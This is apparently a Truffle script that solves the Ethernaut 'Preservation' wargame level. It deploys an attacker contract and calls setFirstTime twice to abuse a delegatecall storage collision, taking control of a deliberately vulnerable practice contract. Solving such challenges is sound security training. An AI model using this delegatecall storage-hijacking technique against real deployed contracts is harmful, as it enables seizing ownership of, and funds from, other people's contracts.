module.exports = async function({ artifacts, web3, ethernaut }) {
  const Preservation = artifacts.require('Preservation');
  const PreservationHack = artifacts.require('PreservationHack');
  const instanceAddress = await ethernaut.createInstance(web3, 'Preservation');
  const contract = await Preservation.at(instanceAddress);

  const hackContract = await PreservationHack.new();
  await contract.setFirstTime(hackContract.address);
  await contract.setFirstTime(hackContract.address);

  return ethernaut.submitInstance(web3, instanceAddress);
};